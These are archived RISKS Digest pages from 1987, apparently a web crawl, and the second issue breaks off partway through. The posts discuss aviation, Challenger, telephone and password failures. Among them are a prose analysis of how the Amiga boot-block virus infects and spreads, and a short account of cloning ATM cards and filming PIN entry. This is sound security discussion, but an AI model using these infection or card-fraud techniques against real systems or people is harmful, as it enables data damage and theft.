From: umn-cs!datapg.MN.ORG!sewilco@cs-gw.D.UMN.EDU (Scot E. Wilcoxon)

The random failure of a $13 circuit breaker may have contributed to an
airplane crash.  Also, an indicator in the simulator for the aircraft
behaves differently than in the real aircraft when that failure occurs.

Northwest Flight 255 apparently crashed in Detroit three months ago because
the flaps were not lowered during takeoff.  The MD 80's takeoff warning
system should have warned the pilot, but its audio warning "flaps, flaps"
was not on the cockpit recording so the warning system probably failed.

NTSB examination of a $13 circuit breaker that supplies power to the
warning system has found several planes with breakers that would not
pass the electrical current that they should.

A McDonnell Douglas document states that when power fails to the warning
system, a warning light (CAWS fail light) should go on in the cockpit.
That is what happens in the MD80 simulator, but in an actual MD80 aircraft
the warning light does not go on.

A McDonnell Douglas official said the document is "clearly in error".  (quoting
StarTribune:) "This revelation has put the FAA in the awkward position of
ordering changes that will make the simulators behave the same way as the
airplane instead of making the airplane behave like the simulator."

The simulator will be altered instead of airplanes because the warning
system is classified by the FAA as not requiring backup systems.  The
warning system is required (FAA won't allow takeoff if it is not working),
but is considered "nonessential" for manufacturing purposes (FAA does
not require backup systems for nonessential systems).

(Information from 11/28/87 Minneapolis Star Tribune, pg 1,4D)

Scot E. Wilcoxon	sewilco@DataPg.MN.ORG	{ems,meccts}!datapg!sewilco
Data Progress		Minneapolis, MN, USA	+1 612-825-2607

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Whistle-blowers who aren't
</A>
</H3>
<address>
&lt;<A HREF="mailto:mnetor!utzoo!henry@uunet.UU.NET">
mnetor!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Wed, 2 Dec 87 15:47:52 EST
</i><PRE>

&gt;  Maxson will share the stage with former Morton Thiokol engineer Roger
&gt;  Boisjoly, who currently has a billion-dollar suit underway...

Maybe I am just being picky about this, but it still makes me see red when
I see Boisjoly described as a "whistle-blower".  Boisjoly is the man who
could have blown the whistle BUT DIDN'T, and seven astronauts died as a
result.  Boisjoly was the engineer who told MT management "don't launch",
was told "put on your management hat", did so, and changed his expert
professional opinion 180 degrees to match his hat color.  In a just world,
I cannot help but think that he (and, certainly, his management) would be
facing criminal charges.  Boisjoly did not blow the whistle; he merely
turned "state's evidence" after the fact.

Henry Spencer @ U of Toronto Zoology {allegra,ihnp4,decvax,pyramid}!utzoo!henry

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: Space Shuttle Whistle-Blowers Sound Alarm Again (reprint) 
</A>
</H3>
<address>
&lt;<A HREF="mailto:mnetor!utzoo!henry@uunet.UU.NET">
mnetor!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Wed, 2 Dec 87 15:48:00 EST
</i><PRE>

&gt; ... new and improved shuttle escape mechanisms. Lot's of
&gt; money is being spent, but whether reported or not, upon (close) examination
&gt; none of these mechanisms would prevent the death of astronauts in a
&gt; Challenger type disaster.  I wonder just how much additional engineering
&gt; is happening for purely public relations purposes...

The escape work is not being done for purely public relations purposes; it
merely, for the most part, does not address situations as severe as the
Challenger disaster.  There is in fact some attention being given to such
situations, but the thorough re-examination of shuttle safety issues turned
up other cases where modest effort would yield a much higher probability
of survival.  The reason why most escape-system work is not addressing the
Challenger scenario is that it is very difficult to get the crew out
of such a situation reliably!  There are also tradeoffs to be considered:
regardless of managerial idiots blithering about safety being an absolute
priority, the only way to make the shuttles completely safe is to put them
in museums and never fly them again.  In practice, there is no way to avoid
some level of compromise between safety and utility, since adding any type
of escape system reduces payload.  There are also safety-vs-safety tradeoffs
to be made, since even simple ejection seats can and do fire accidentally,
often with fatal consequences.

Henry Spencer @ U of Toronto Zoology {allegra,ihnp4,decvax,pyramid}!utzoo!henry

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
A new twist to password insecurity (human factors)
</A>
</H3>
<address>
Roy Smith
&lt;<A HREF="mailto:roy%phri@uunet.UU.NET ">
roy%phri@uunet.UU.NET 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 6 Dec 87 00:19:06 GMT
Organization: Public Health Research Institute, NYC, NY

A bunch of people around here have signed up for the BRS/Colleague
bibliographic data base service.  Each person has an individual account
number and (supposedly secret) password.  We get a combined invoice each
month, with usage itemized and identified, but only by account number (not
by name).  Our accounting office didn't know what to do with the account
numbers, so I called BRS and asked for a list of which name corresponds to
which account number.  Much to my surprise, I got in the mail a few days
later a list of names, account numbers, *and passwords*.

Roy Smith, {allegra,cmcl2,philabs}!phri!roy
System Administrator, Public Health Research Institute
455 First Avenue, New York, NY 10016

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
More on PIN encoding
</A>
</H3>
<address>
Chris Maltby
&lt;<A HREF="mailto:munnari!softway.oz.au!chris@uunet.UU.NET ">
munnari!softway.oz.au!chris@uunet.UU.NET 
</A>&gt;
</address>
<i>
2 Dec 87 11:47:01 +1100 (Wed)
</i><PRE>

A recent fraud case in Sydney reveals that the PIN details are either
encoded on the card, or a function of the card number. The perpetrators of
the fraud used some ingenuity in their system.

The first stage was to deduce the magnetic encoding on the card's strip from
discarded receipts collected around ATMs, and then manufacture cards which
duplicated the real card. Unfortunately for them, they were unable to break
the PIN encoding algorithm, so they resorted to hanging around in their cars
opposite the ATM location with a portable video camera and a zoom lens. When
some unsuspecting user left behind a recipt card they were able to
re-manufacture his card and replay the video of his PIN entry.

There are several morals. First - don't leave your receipts at the machine.
Second - stand close when entering your PIN. Third - don't use the system at
all - can you trust any system which is this easy to break. If the forgers
had been just a bit more resourceful they would have decoded the PIN as
well.  Of course, the "conditions of use" of your card make you liable for
such frauds...

Chris Maltby - Softway Pty Ltd	(chris@softway.oz)

PHONE:	+61-2-698-2322   uunet!softway.oz!chris   chris@softway.oz.au

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Telephone overload (Re: <A HREF="/Risks/5.63.html">RISKS-5.63</A>)
</A>
</H3>
<address>
Stephen Grove
&lt;<A HREF="mailto:ptsfa!pbhya!seg@ames.arpa ">
ptsfa!pbhya!seg@ames.arpa 
</A>&gt;
</address>
<i>
Wed, 2 Dec 87 16:09:35 PST
</i><PRE>
Organization: Pacific * Bell, San Ramon, CA

&gt; Date:         Fri, 20 Nov 87 15:17:09 PST
&gt; From: "LT Scott A. Norton, USN" &lt;4526P%NAVPGS.BITNET@wiscvm.wisc.edu&gt;
&gt; Subject:      L.A. Earthquake &amp; Telephone Service
&gt; 
&gt; Can anyone with better knowledge of the phone companies' local offices tell
&gt; me if there is some simple way to shed this extra load in a reasonable way?
&gt; I know that after some minutes off the hook, the phone loses its dial tone.
&gt; Does this adequately release the resources the off-the-hook phone was using?

The older electromechanical systems, required someone to throw a switch and
remove the battery supply from the non-priority customers.
Priority-customers being those in the class of Hospitals, Police, Fire, etc.

The newer ESS offices (ESS = Electronic Switching Systems, using stored
programs for control, as opposed to hard-wired logic) determine when the
load is getting excessive, and delay the response to nonpriority customers
by a factor of three (I think). In other words if the ESS normally responds in
300ms, it will now take 900ms. I have seen it work in a flood, and it worked
fine.  It was inhibited at first, and the ESS repeatedly stated the need to
implement the control, and was unable to serve anyone, but when allowed,
response was slower, but the calls went through.

For call in programs and promotions, we like to provide special prefixes
that can be limited in the number of interoffice channels they can access.

	 Stephen Grove, Pac Bell, Rohnert Park, Calif.
		UUCP:{ihnp4,dual,sun,hoptoad}!ptsfa!pbhya!seg

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Software licensing problems
</A>
</H3>
<address>
Geof Cooper
&lt;<A HREF="mailto:imagen!geof@decwrl.dec.com ">
imagen!geof@decwrl.dec.com 
</A>&gt;
</address>
<i>
Wed, 2 Dec 87 12:47:00 pst
</i><PRE>

We too have experienced the problem of software licensed to run on only some
nodes.  Our approach has been to convince the repairman types to switch the
Node-ID rom's on the apollos in question, so that your access key follows
you where you go.  I've never seen the address ROM itself fail!

Apollo Computer has recently brought out a product that allows N copies of a
program to be running simultaneously on any of some larger number of
machines.  It remains to be seen if any vendors will be interested in using
the product.  From the vendors' point of view, there is a possible financial
risk to adopting the new scheme, since many programs are used less than full
time; the customer might elect to buy fewer copies of the program and take
the risk that occasionally someone will have to "wait for a dialtone".
E.g., we have about 25-30 licenses for Interleaf's desktop publishing
software.  I've never seen more than 15 of them in use at once).
                                                                  - Geof

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Re: Mariner 1 or Apollo 11? (<A HREF="/Risks/5.63.html">RISKS-5.63</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:mnetor!utzoo!henry@uunet.UU.NET">
mnetor!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Wed, 2 Dec 87 15:48:18 EST
</i><PRE>

&gt;     I heard that the famous "./," disaster caused the problem with the
&gt; onboard IBM 1800 on Apollo 11...

The onboard computers on Apollo were not IBM 1800s unless I have confused
the numbers badly, and almost certainly they were programmed in assembler
due to severely limited ROM capacity, so I'd be a bit skeptical of this.

				Henry Spencer @ U of Toronto Zoology
				{allegra,ihnp4,decvax,pyramid}!utzoo!henry

</PRE>
<HR><H3><A NAME="subj9.2">
Re: Mariner 1 or Apollo 11?
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Mon, 30 Nov 87 22:26:10 PST
From: Brent Chapman &lt;chapman%mica.Berkeley.EDU@violet.berkeley.edu&gt;

In <A HREF="/Risks/5.64.html">RISKS-5.64</A>, Scott Dorsey &lt;kludge@pyr.gatech.edu&gt; writes:

&gt;    I heard that the famous "./," disaster caused the problem with the
&gt;onboard IBM 1800 on Apollo 11.  I heard this from a professor who teaches
&gt;Fortran, so I'm not so sure about the reliability of the source.  Anyone
&gt;else have information on either the Apollo or the Mariner problems?

If you mean the "decent alarm" that occurred in the Lunar Module moments
before lunar touchdown, then one of the NASA documentaries (unfortunately,
I don't remember the title, or even when or where I saw it) told a different
story.  They said that the alarm was caused by an overload condition in the
processor; apparently the Armstrong and Aldrin had left a certain sensor
(radar altimiter, I think) enabled that was supposed to have been shut down
by that point in the landing sequence, and the added load of that sensor
caused the computer to falsely register an alarm condition.  If I remember
correctly, the programmer that had written the piece of code involved was
in Mission Control at the time the alarm occurred; he stared at the situation
and status boards for a few seconds, then announced that he knew what the 
problem was, that it was a false reading, and advised to continue the landing
(although I'm not sure if they could have aborted at that stage or not).

I may be confusing what I saw in the documentary (that the false decent alarm
happened because the processor was overloaded because a sensor that should have
been turned off wasn't) with "urban legend" (that the programmer responsible
was in Mission Control, etc.); can anyone else back me up on this?

Brent Chapman					Capital Market Technology, Inc.
Senior Programmer/Analyst			1995 University Ave., Suite 390
{lll-tis,ucbvax!cogsci}!capmkt!brent		Berkeley, CA  94704
capmkt!brent@{lll-tis.arpa,cogsci.berkeley.edu} Phone: 415/540-6400

   [I am sorry that misinformation is still flowing on this subject.  I have
   held up a large number of potential contributions to RISKS, awaiting a
   definitive report that is rumored to be working its way RISKSward.  PGN]

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
More on addressable converter box
</A>
</H3>
<address>
Allan Pratt
&lt;<A HREF="mailto:ucbcad!ames.UUCP!atari!apratt@ucbvax.Berkeley.EDU ">
ucbcad!ames.UUCP!atari!apratt@ucbvax.Berkeley.EDU 
</A>&gt;
</address>
<i>
Mon, 30 Nov 87 11:40:31 pst
</i><PRE>

RISKS@KL.SRI.COM (RISKS FORUM, Peter G. Neumann -- Coordinator):

I have a note to add about my addressable converter box: the hardware is
two-way capable.  I know this because there is an "event" button which
you hit to purchase an event on Pay-Per-View.  You then key in your
purchase-authorization code, and you get the event.  Obviously, the box
has to be two-way, because the cable company has to be able to bill you. 
Now, the particular cable company in my area does not support this, but
the box hardware &amp; software do.  The manual talks about it, with an "If
your cable company supports it" disclaimer. 

Opinions expressed above do not necessarily	-- Allan Pratt, Atari Corp.
reflect those of Atari Corp. or anyone else.	  ...ames!atari!apratt

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
centralized car locks (foaf)
</A>
</H3>
<address>
K. Richard Magill
&lt;<A HREF="mailto:umix!oxtrap!rich@RUTGERS.EDU ">
umix!oxtrap!rich@RUTGERS.EDU 
</A>&gt;
</address>
<i>
30 Nov 87 18:17:47 GMT
</i><PRE>
Organization: Oxford TP, Ann Arbor

It's my understanding that a certain lesser known car (the Bricklin) was
sold with entirely electronic locks.  When the battery died or shorted you
were entirely locked out.  The Bricklin had gull wing doors.
                                                                rich.

                                 [When the gulls attacked, the car owners 
                                 were known as the Bricklin drudgers.  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.69.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.71.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-23</DOCNO>
<DOCOLDNO>IA012-000130-B022-286</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.71.html 128.240.150.127 19970217014451 text/html 34357
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:43:16 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 71</TITLE>
<LINK REL="Prev" HREF="/Risks/5.70.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.72.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.70.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.72.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 71</H1>
<H2> Monday, 7 December 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
The Amiga VIRUS (by Bill Koester)  
</A>
<DD>
<A HREF="#subj1.1">
Bernie Cosell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Radar's Growing Vulnerability 
</A>
<DD>
<A HREF="#subj2.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Computerized vote counting 
</A>
<DD>
<A HREF="#subj3.1">
Lance J. Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  United Airlines O'Hare Sabotage? 
</A>
<DD>
<A HREF="#subj4.1">
Chuck Weinstock
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Whistle-blowers who (allegedly) aren't 
</A>
<DD>
<A HREF="#subj5.1">
Jeffrey Mogul
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  In Decent Alarm 
</A>
<DD>
<A HREF="#subj6.1">
Bruce N. Baker
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Need for first-person anonymous reporting systems 
</A>
<DD>
<A HREF="#subj7.1">
Eugene Miya
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Apollo 11 computer problems 
</A>
<DD>
<A HREF="#subj8.1">
Michael MacKenzie
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Interconnected ATM networks 
</A>
<DD>
<A HREF="#subj9.1">
Win Treese
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Can you sue an expert system? 
</A>
<DD>
<A HREF="#subj10.1">
Gary Chapman
</A><br>
<A HREF="#subj10.2">
 Jerry Leichter
</A><br>
<A HREF="#subj10.3">
 Bruce Hamilton
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  What this country needs is a good nickel chroot 
</A>
<DD>
<A HREF="#subj11.1">
Bob English
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
 The Amiga VIRUS (by Bill Koester)
</A>
</H3>
<address>
Bernie Cosell 
&lt;<A HREF="mailto:cosell@WILMA.BBN.COM">
cosell@WILMA.BBN.COM
</A>&gt;
</address>
<i>
Mon, 7 Dec 87 0:25:23 EST
</i><PRE>

From: bill@cbmvax.UUCP (Bill Koester CATS)
Newsgroups: comp.sys.amiga
Subject: Amiga VIRUS
Date: 13 Nov 87 19:32:05 GMT
Organization: Commodore Technology, West Chester, PA

                   THE AMIGA VIRUS - Bill Koester (CATS)

When I first got a copy of the Amiga VIRUS I was interested to see
how such a program worked. I dissassembled the code to a disk file and
hand commented it. This article will try to pass on some of the things
I have learned through my efforts.

       1) Definition.  2) Dangers.  3) Mechanics 4) Prevention

1. - Definition.

   The Amiga VIRUS is simply a modification of the boot block of an existing
DOS boot disk. Any disk that can be used to boot the Amiga (ie workbench)
has a reserved area called the boot block. On an Amiga floppy the bootblock
consists of the first two sectors on the disk. Each sector is 512 bytes long
so the boot block contains 1024 bytes. When KickStart is bringing up the
system the disk in drive 0 is checked to see if it is a valid DOS boot disk.
If it is, the first two sectors on the disk are loaded into memory and
executed. The boot block normally contains a small bit of code that loads
and initializes the DOS. If not for this BOOT CODE you would never see the
initial CLI. The normal BOOT CODE is very small and does nothing but call
the DOS initialization. Therefore, on a normal DOS boot disk there is plenty
of room left unused in the BOOT BLOCK.

   The VIRUS is a replacement for the normal DOS BOOT CODE. In addition to
performing the normal DOS startup the VIRUS contains code for displaying
the VIRUS message and infecting other disks. Once the machine is booted from
an infected disk the VIRUS remains in memory even after a warm start.
Once the VIRUS is memory resident the warm start routine is affected, instead
of going through the normal startup the VIRUS checks the boot disk in drive
0 for itself. If the VIRUS in memory sees that the boot block is not
infected it copies itself into the boot block overwriting any code that was
there before. It is in this manner that the VIRUS propagates from one disk
to another. After a certain number of disks have been infected the VIRUS
will print a message telling you that Something wonderful has happened.

2. - Dangers.

   When the VIRUS infects a disk the existing boot block is overwritten.
Since some commercial software packages and especially games store special
information in the boot block the VIRUS could damage these disks. When the
boot block is written with the VIRUS, any special information is lost
forever. If it was your only copy of the game then you are out of luck
and probably quite angry!!

3. - Mechanics.

   Here is a more detailed description of what the virus does. This is
intended to be used for learning and understanding ONLY!! It is not the
authors intention that this description be used to create any new strains of
the VIRUS. What may have once been an innocent hack has turned into
a destructive pain in the #$@ for many people. Lets not make it any worse!!

   a.)   Infiltration.

            This is the first stage of viral infection. The machine is
         brought up normally by reading the boot block into memory. When
         control is transferred to the boot block code, the virus code
         immediately copies the entire boot block to $7EC00, it then JSR's
         to the copied code to wedge into the CoolCapture vector. Once
         wedged in, control returns to the loaded boot block which performs
         the normal dos initialization. Control is then returned to the
         system.

   b.)   Hiding Out.

            At this point the system CoolCapture vector has been replaced
         and points to code within the virus. When control is routed through
         the CoolCapture vector the virus first checks for the left mouse
         button, if it is down the virus clears the CoolCapture wedge and
         returns to the system. If the left mouse button is not pressed
         the virus replaces the DoIO code with its own version of DoIO
         and returns to the system.

   c.)   Spreading.

            The code so far has been concerned only with making sure that
         at any given time the DoIO vector points to virus code. This is
         where the real action takes place. On every call to DoIO the virus
         checks the io_Length field of the IOB if this length is equal to
         1024 bytes then it could possibly be a request to read the boot
         block. If the io_Data field and A4 point to the same address
         then we know we are in the strap code and this is a boot block
         read request. If this is not a boot block read the normal
         DoIO vector is executed as if the virus was not installed. If we
         are reading the boot block we JSR to the old DoIO code to read
         the boot block and then control returns to us. After reading,
         the checksum for the virus boot block is compared to the checksum
         for the block just read in. If they are equal this disk is already
         infected so just return. If they are not equal a counter is
         incremented and the copy of the virus at $7EC00 is written to
         the boot block on the disk. If the counter ANDed with $F is equal
         to 0 then a rastport and bitmap are constructed and the message
         is displayed.

   d.)   Ha Ha.

            &lt; Something wonderful has happened &gt;
            &lt; Your AMIGA is alive!!! &gt;
            &lt; and even better &gt;
            &lt; Some of your disks are infected by a VIRUS &gt;
            &lt; Another masterpiece of the Mega-Mighty SCA &gt;

4. - Prevention.

   How do you protect yourself from the virus?

      1) Never warm start the machine, always power down first.
         (works but not to practical!)

      2) Always hold down the left mouse button when rebooting.
         (Also works, but only because the VIRUS code checks for
          this special case. Future VIRUS's may not!)

      3) Obtain a copy of VCheck1.1 and check all disks before use.
         If any new virus's appear this program will be updated and released
         into the public domain. VCheck1.1 was posted to usnet and will
         also be posted to BIX.
         ( Just like the real thing the best course of action is
           education and prevention!)

Bill Koester -- CBM  &gt;&gt;Amiga Technical Support&lt;&lt;
                     UUCP  ...{allegra|burdvax|rutgers|ihnp4}!cbmvax!bill 
		     PHONE  (215) 431-9355

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Radar's Growing Vulnerability
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:NEUMANN@csl.sri.com">
NEUMANN@csl.sri.com
</A>&gt;
</address>
<i>
Mon 7 Dec 87 13:52:21-PST
</i><PRE>
To: RISKS@KL.SRI.COM

For readers of SCIENCE, the 27 November 1987 issue (p. 1219) has a nice article
by Stephen Budiansky (titled asa the Subject line above) on the problems of
defensive radars.  ``As weapons become smarter, they learn to "see" radar beams
as pathways to their target, gaining an advantage over defensive systems.''
The caption on a picture of the smoking HMS Sheffield says that it ``was hit in
the Falkland Islands war in 1982 when its radars attracted a rocket launched
from a fighter plane 20 miles way.''  (RISKS readers will recall that the
British investigation concluded that the Sheffield's own radars were jammed by
a communcation back to London that was being held at the time.)

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
     Computerized vote counting
</A>
</H3>
<address>
Lance J. Hoffman 
&lt;<A HREF="mailto:LANCE%GWUVM.BITNET@WISCVM.WISC.EDU">
LANCE%GWUVM.BITNET@WISCVM.WISC.EDU
</A>&gt;
</address>
<i>
Mon, 7 Dec 1987 14:22 EST
</i><PRE>
To: &lt;RISKS@csl.sri.com&gt;

I have just completed a study of computerized vote-counting systems.  The
report, based on a workshop of experts in election administration and
computer security, presents recommendations to improve the security and
reliability of computerized vote-counting systems.  The recommendations are
organizational, not technical, because that is where the most important
problems lie.  However, five focus papers are included, including one by
Willis Ware on "A Computer Technologist's View".  For a free copy, please
send a snail mail or email request with your complete snail mail address to

                Election Computer Security Project
                Dept of Electrical Engineering &amp; Computer Science
                The George Washington University
                Washington DC 20052

Lance Hoffman   (LANCE@GWUVM.BITNET)

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
United Airlines O'Hare Sabotage?
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Mon, 07 Dec 87 17:36:28 EST
From: Chuck Weinstock &lt;weinstoc@SEI.CMU.EDU&gt;

On December 3, I was traveling from California to Pittsburgh via Chicago on
United.  My inbound flight came in at an E gate and my outbound left from a
new C gate.  If an agent hadn't been there to greet the plane, I wouldn't
have known it because the monitors were out.  I got to the C terminal and
the monitors there were on but unreadable due to jiggle (all of them.)  I
went to a pay phone and could not get a dial tone (on any of them.)  I
boarded my flight and we sat for an extra 20 minutes because "a cable had
been cut" and thus they were unable to calculate the amount of fuel to load.
I surmised that this was a landside cable and that all of the above events
were somehow related.

I decided to call United today and learned that my surmise was true.
Multiple fires in the basement of terminal 2 caused both AT&amp;T and United
wires to be severed.  The former knocked out the pay phones, and the latter
the airline's ability to communicate with it's computers across town.

It also seems that, at the new terminal at least, there is an automatic,
underground fueling system which shut off once it detected a fire. Technicians
were able to override the interlock once they determined that there was no
danger due to the fire, and the pilots apparently had to do fuel calculations
manually.  Given that United has a new computerized baggage routing system at
O'Hare, I'm really surprised that my luggage made the connection ok.

175 flights were delayed on Thursday and Friday morning.  Officials suspect
arson though the United spokesman I talked to could not suggest a motive.
Full phone service to the terminal was not restored until Friday evening.
United is awaiting licensing of a microwave system in the near future to leave
themselves less vulnerable to this sort of sabotage.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Whistle-blowers who (allegedly) aren't
</A>
</H3>
<address>
Jeffrey Mogul
&lt;<A HREF="mailto:mogul@decwrl.dec.com ">
mogul@decwrl.dec.com 
</A>&gt;
</address>
<i>
7 Dec 1987 1646-PST (Monday)
</i><PRE>

Henry Spencer writes:
    Maybe I am just being picky about this, but it still makes me see red when
    I see Boisjoly described as a "whistle-blower".  Boisjoly is the man who
    could have blown the whistle BUT DIDN'T, and seven astronauts died as a
    result.  Boisjoly was the engineer who told MT management "don't launch",
    was told "put on your management hat", did so, and changed his expert
    professional opinion 180 degrees to match his hat color...

I recently saw a videotape of Boisjoly's appearance at MIT.  I think Henry is
somewhat confused; Boisjoly made it quite clear that it was another person
(higher up in the management structure) who was told to "put on your
management hat" and who in fact reversed his engineering opinion (and, as I
recall, that was enough to overrule the other engineers).  True, Boisjoly did
not blow the whistle (i.e., go outside Morton Thiokol) at this point, but he
says that he and other engineers were quite upset at the time, and he referred
to a notebook entry he made that night expressing his fear about the next
day's launch and his unease at the management actions.

What he did blow the whistle on was a coverup by Morton Thiokol of the
long trail of engineering dissent over the previous year or so, due
mostly to Boisjoly and several colleagues.

It is hard, even in hindsight, to say that Boisjoly himself did not do all he
should have done on the eve of the launch, and is therefore criminally liable
(I'll agree that his management was at fault).  Who could he have gone to with
just a few (nighttime) hours before the launch, with no irrefutable evidence,
and no support from either his management or from NASA?  (It has been
suggested that NASA was under pressure from the White House to launch in time
for the State of the Union speech that day; Boisjoly wouldn't have found many
politicians willing to delay the launch!) In hindsight, most people would
agree that he was right to object, but at the time he would have been rather
isolated.

I think it is important to stress that Boisjoly (if his own account is
trustworthy) was not "turning state's evidence after the fact," but rather
blowing the whistle on a coverup of his internal dissent.
                                                            -Jeff Mogul

P.S.: This videotape is fascinating and a lot more damning of both
NASA and Morton Thiokol than my summary is.  It's also quite sad; in
the process of urging a room full of MIT students to be prepared to
blow whistles, Boisjoly also conveys the strong personal costs of doing
so.  I'll try to find out how people can obtain a copy.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
In "Decent Alarm"? (Re: Mariner 1 or Apollo 11? in <A HREF="/Risks/5.70.html">RISKS-5.70</A>)
</A>
</H3>
<address>
Bruce N. Baker 
&lt;<A HREF="mailto:BNBaker@KL.SRI.COM">
BNBaker@KL.SRI.COM
</A>&gt;
</address>
<i>
Mon 7 Dec 87 10:46:49-PST
</i><PRE>
To: neumann@csl.sri.com

The idea of a "decent alarm" conjures up all sorts of images and fantasies for
me, but perhaps Brent Chapman meant "descent alarm".
                                                       Bruce
    [Skunked again.  Thanks for descenting.  PGN]

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
